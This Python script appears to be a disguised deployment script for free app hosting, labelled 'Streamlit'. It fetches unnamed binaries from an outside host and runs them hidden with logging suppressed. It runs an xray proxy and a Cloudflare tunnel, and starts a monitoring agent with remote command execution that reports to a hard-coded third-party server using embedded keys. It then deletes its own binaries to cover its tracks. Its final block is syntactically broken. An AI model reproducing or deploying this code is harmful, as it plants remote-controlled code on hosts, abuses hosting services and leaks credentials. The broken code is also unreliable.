import os
import sys
import json
import base64
import random
import string
import subprocess
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import logging
from pathlib import Path

# 环境变量配置
UPLOAD_URL = os.getenv('UPLOAD_URL', '')
PROJECT_URL = os.getenv('PROJECT_URL', '')
AUTO_ACCESS = os.getenv('AUTO_ACCESS', 'false').lower() == 'true'
FILE_PATH = os.getenv('FILE_PATH', './tmp')
SUB_PATH = os.getenv('SUB_PATH', 'sub')
PORT = int(os.getenv('SERVER_PORT', os.getenv('PORT', '3210')))
UUID = os.getenv('UUID', '4492faf4-18ed-4820-967f-63313572bd78')
NEZHA_SERVER = os.getenv('NEZHA_SERVER', 'ycv.dpdns.org:8008')
NEZHA_PORT = os.getenv('NEZHA_PORT', '')
NEZHA_KEY = os.getenv('NEZHA_KEY', 'uK6lptvEoZ7TsX6yzjOxSd3RYeGCHCJj')
ARGO_DOMAIN = os.getenv('ARGO_DOMAIN', 'py.a.5.a.f.0.7.4.0.1.0.0.2.ip6.arpa')
ARGO_AUTH = os.getenv('ARGO_AUTH', 'eyJhIjoiMTZlZDI2MTFjNGE5ZGYzYjQ5NWNjYzA4NWU2MWVkN2YiLCJ0IjoiYzM5ZWU3NjYtMGU1YS00MTQzLTk1YWEtZjA5MDdhNjZmMjNmIiwicyI6Ik5ESmpaRFEyTmpFdE5tTXdNQzAwTVRrMExUazBPVFl0WkdWbE9EazRNRFpsWVdKaiJ9')
ARGO_PORT = int(os.getenv('ARGO_PORT', '8001'))
CFIP = os.getenv('CFIP', 'cdns.doon.eu.org')
CFPORT = int(os.getenv('CFPORT', '443'))
NAME = os.getenv('NAME', 'Streamlit')

# 创建运行目录
Path(FILE_PATH).mkdir(exist_ok=True)

# 生成随机文件名
def generate_random_name(length=6):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

# 全局文件名
npm_name = generate_random_name()
web_name = generate_random_name()
bot_name = generate_random_name()
php_name = generate_random_name()

npm_path = os.path.join(FILE_PATH, npm_name)
php_path = os.path.join(FILE_PATH, php_name)
web_path = os.path.join(FILE_PATH, web_name)
bot_path = os.path.join(FILE_PATH, bot_name)
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Hello world!')
        elif self.path == f'/{SUB_PATH}':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            if os.path.exists(sub_path):
                with open(sub_path, 'r') as f:
                    content = f.read()
                self.wfile.write(content.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # 禁用默认的日志输出
        pass

# 删除历史节点
def delete_nodes():
    if not UPLOAD_URL or not os.path.exists(sub_path):
        return
    
    try:
        with open(sub_path, 'r') as f:
            file_content = f.read()
        
        decoded = base64.b64decode(file_content).decode('utf-8')
        nodes = [line for line in decoded.split('\n') if any(proto in line for proto in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
        
        if nodes:
            requests.post(f'{UPLOAD_URL}/api/delete-nodes', 
                         json={'nodes': nodes},
                         headers={'Content-Type': 'application/json'})
    except Exception:
        pass

# 清理历史文件
def cleanup_old_files():
    try:
        for file in os.listdir(FILE_PATH):
            file_path = os.path.join(FILE_PATH, file)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    except Exception:
        pass

# 生成 xray 配置文件
def generate_config():
    config = {
        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
        "inbounds": [
            {
                "port": ARGO_PORT,
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
                    "decryption": "none",
                    "fallbacks": [
                        {"dest": 3001},
                        {"path": "/vless-argo", "dest": 3002},
                        {"path": "/vmess-argo", "dest": 3003},
                        {"path": "/trojan-argo", "dest": 3004}
                    ]
                },
                "streamSettings": {"network": "tcp"}
            },
            {
                "port": 3001,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {"clients": [{"id": UUID}], "decryption": "none"},
                "streamSettings": {"network": "tcp", "security": "none"}
            },
            {
                "port": 3002,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {"clients": [{"id": UUID, "level": 0}], "decryption": "none"},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3003,
                "listen": "127.0.0.1",
                "protocol": "vmess",
                "settings": {"clients": [{"id": UUID, "alterId": 0}]},
                "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3004,
                "listen": "127.0.0.1",
                "protocol": "trojan",
                "settings": {"clients": [{"password": UUID}]},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            }
        ],
        "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
        "outbounds": [
            {"protocol": "freedom", "tag": "direct"},
            {"protocol": "blackhole", "tag": "block"}
        ]
    }
    
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)

# 获取系统架构
def get_system_architecture():
    arch = os.uname().machine
    if 'arm' in arch or 'aarch' in arch:
        return 'arm'
    else:
        return 'amd'

# 下载文件
def download_file(file_name, file_url):
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        
        with open(file_name, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # 设置文件权限
        os.chmod(file_name, 0o775)
        print(f"Download {os.path.basename(file_name)} successfully")
        return True
    except Exception as e:
        print(f"Download {os.path.basename(file_name)} failed: {e}")
        return False

# 根据架构获取文件列表
def get_files_for_architecture(architecture):
    base_files = []
    
    if architecture == 'arm':
        base_files = [
            (web_path, "https://arm64.ssss.nyc.mn/web"),
            (bot_path, "https://arm64.ssss.nyc.mn/bot")
        ]
    else:
        base_files = [
            (web_path, "https://amd64.ssss.nyc.mn/web"),
            (bot_path, "https://amd64.ssss.nyc.mn/bot")
        ]
    
    if NEZHA_SERVER and NEZHA_KEY:
        if NEZHA_PORT:
            npm_url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
            base_files.insert(0, (npm_path, npm_url))
        else:
            php_url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
            base_files.insert(0, (php_path, php_url))
    
    return base_files

# 下载并运行文件
def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)
    
    if not files_to_download:
        print("Can't find files for the current architecture")
        return
    
    # 下载文件
    for file_name, file_url in files_to_download:
        if not download_file(file_name, file_url):
            return
    
    # 运行哪吒监控
    if NEZHA_SERVER and NEZHA_KEY:
        if not NEZHA_PORT:
            # 哪吒 v1
            port = NEZHA_SERVER.split(':')[-1] if ':' in NEZHA_SERVER else ''
            tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
            nezha_tls = 'true' if port in tls_ports else 'false'
            
            # 生成 config.yaml
            config_yaml = f"""
client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
            
            with open(os.path.join(FILE_PATH, 'config.yaml'), 'w') as f:
                f.write(config_yaml)
            
            # 运行 v1
            command = f"nohup {php_path} -c {FILE_PATH}/config.yaml >/dev/null 2>&1 &"
            subprocess.run(command, shell=True)
            print(f"{php_name} is running")
            time.sleep(1)
        else:
            # 哪吒 v0
            tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
            nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
            
            command = f"nohup {npm_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &"
            subprocess.run(command, shell=True)
            print(f"{npm_name} is running")
            time.sleep(1)
    else:
        print('NEZHA variable is empty, skip running')
    
    # 运行 xray
    command1 = f"nohup {web_path} -c {config_path} >/dev/null 2>&1 &"
    subprocess.run(command1, shell=True)
    print(f"{web_name} is running")
    time.sleep(1)
    
    # 运行 cloudflared
    if os.path.exists(bot_path):
        if ARGO_AUTH and len(ARGO_AUTH) >= 120 and ARGO_AUTH.isalnum():
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif ARGO_AUTH and 'TunnelSecret' in ARGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {FILE_PATH}/tunnel.yml run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT}"
        
        command = f"nohup {bot_path} {args} >/dev/null 2>&1 &"
        subprocess.run(command, shell=True)
        print(f"{bot_name} is running")
        time.sleep(2)
    
    time.sleep(5)

# 配置 Argo 隧道
def argo_type():
    if not ARGO_AUTH or not ARGO_DOMAIN:
        print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
        return
    
    if 'TunnelSecret' in ARGO_AUTH:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
            f.write(ARGO_AUTH)
        
        # 解析 tunnel ID
        try:
            auth_data = json.loads(ARGO_AUTH)
            tunnel_id = auth_data.get('TunnelSecret', '').split('"')[11] if 'TunnelSecret' in ARGO_AUTH else ''
        except:
            tunnel_id = ARGO_AUTH.split('"')[11] if '"' in ARGO_AUTH else ''
        
        tunnel_yaml = f"""
tunnel: {tunnel_id}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
            f.write(tunnel_yaml)
    else:
        print("ARGO_AUTH mismatch TunnelSecret, use token connect to tunnel")

# 提取域名并生成订阅
def extract_domains():
    argo_domain = None
    
    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print('ARGO_DOMAIN:', argo_domain)
        generate_links(argo_domain)
    else:
        try:
            if os.path.exists(boot_log_path):
                with open(boot_log_path, 'r') as f:
                    content = f.read()
                
                import re
                domains = re.findall(r'https?://([^ ]*trycloudflare\.com)/?', content)
                
                if domains:
                    argo_domain = domains[0]
                    print('ArgoDomain:', argo_domain)
                    generate_links(argo_domain)
                else:
                    print('ArgoDomain not found, re-running bot to obtain ArgoDomain')
                    # 重新运行 bot 获取域名
                    if os.path.exists(boot_log_path):
                        os.unlink(boot_log_path)
                    
                    # 终止现有进程
                    subprocess.run(f"pkill -f {bot_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(3)
                    
                    args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT}"
                    command = f"nohup {bot_path} {args} >/dev/null 2>&1 &"
                    subprocess.run(command, shell=True)
                    print(f"{bot_name} is running")
                    time.sleep(3)
                    extract_domains()  # 重新提取
        except Exception as e:
            print(f'Error reading boot.log: {e}')

def generate_links(argo_domain):
    # 获取地理位置信息
    try:
        result = subprocess.run(
            'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
            shell=True, capture_output=True, text=True
        )
        isp = result.stdout.strip()
    except:
        isp = "Unknown"
    
    node_name = f"{NAME}-{isp}" if NAME else isp
    
    # 生成 VMESS 配置
    vmess_config = {
        "v": "2",
        "ps": node_name,
        "add": CFIP,
        "port": CFPORT,
        "id": UUID,
        "aid": "0",
        "scy": "none",
        "net": "ws",
        "type": "none",
        "host": argo_domain,
        "path": "/vmess-argo?ed=2560",
        "tls": "tls",
        "sni": argo_domain,
        "alpn": "",
        "fp": "firefox"
    }
    
    vmess_base64 = base64.b64encode(json.dumps(vmess_config).encode()).decode()
    
    sub_txt = f"""
vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argo_domain}&fp=firefox&type=ws&host={argo_domain}&path=%2Fvless-argo%3Fed%3D2560#{node_name}

vmess://{vmess_base64}

trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argo_domain}&fp=firefox&type=ws&host={argo_domain}&path=%2Ftrojan-argo%3Fed%3D2560#{node_name}
"""
    
    sub_base64 = base64.b64encode(sub_txt.encode()).decode()
    print(sub_base64)
    
    with open(sub_path, 'w') as f:
        f.write(sub_base64)
    
    print(f"{sub_path} saved successfully")
    upload_nodes()

# 上传节点或订阅
def upload_nodes():
    if UPLOAD_URL and PROJECT_URL:
        subscription_url = f"{PROJECT_URL}/{SUB_PATH}"
        json_data = {"subscription": [subscription_url]}
        
        try:
            response = requests.post(f"{UPLOAD_URL}/api/add-subscriptions", 
                                   json=json_data,
                                   headers={'Content-Type': 'application/json'})
            if response.status_code == 200:
                print('Subscription uploaded successfully')
            else:
                pass
        except Exception:
            pass
    elif UPLOAD_URL:
        if not os.path.exists(list_path):
            return
        
        with open(list_path, 'r') as f:
            content = f.read()
        
        nodes = [line for line in content.split('\n') if any(proto in line for proto in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
        
        if nodes:
            try:
                response = requests.post(f"{UPLOAD_URL}/api/add-nodes",
                                       json={'nodes': nodes},
                                       headers={'Content-Type': 'application/json'})
                if response.status_code == 200:
                    print('Nodes uploaded successfully')
            except Exception:
                pass
    else:
        pass

# 清理文件
def clean_files():
    def cleanup():
        time.sleep(90)  # 90秒后清理
        
        files_to_delete = [boot_log_path, config_path, web_path, bot_path]
        
        if NEZHA_PORT and NEZHA_SERVER and NEZHA_KEY:
            files_to_delete.append(npm_path)
        elif NEZHA_SERVER and NEZHA_KEY:
            files_to_delete.append(php_path)
        
        for file_path in files_to_delete:
            try:
                if os.path.exists(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
        
        print('App is running')
        print('Thank you for using this script, enjoy!')
    
    threading.Thread(target=cleanup, daemon=True).start()

# 自动访问任务
def add_visit_task():
    if not AUTO_ACCESS or not PROJECT_URL:
        print("Skipping adding automatic access task")
        return
    
    try:
        response = requests.post('https://oooo.serv00.net/add-url',
                               json={'url': PROJECT_URL},
                               headers={'Content-Type': 'application/json'})
        print('Automatic access task added successfully')
        return response
    except Exception as e:
        print(f'Add automatic access task failed: {e}')
        return None

# 主函数
def start_server():
    try:
        delete_nodes()
        cleanup_old_files()
        argo_type()
        generate_config()
        download_files_and_run()
        extract_domains()
        add_visit_task()
        clean_files()
    except Exception as e:
        print(f'Error in start_server: {e}')

def run_http_server():
    server = HTTPServer(('', PORT), SimpleHTTPRequestHandler)
    print(f"HTTP server is running on port: {PORT}!")
    server.serve_forever()

if __name__ == '__main__':
    # 启动 Streamlit 页面
subprocess.Popen("streamlit run streamlit_app.py", shell=True)




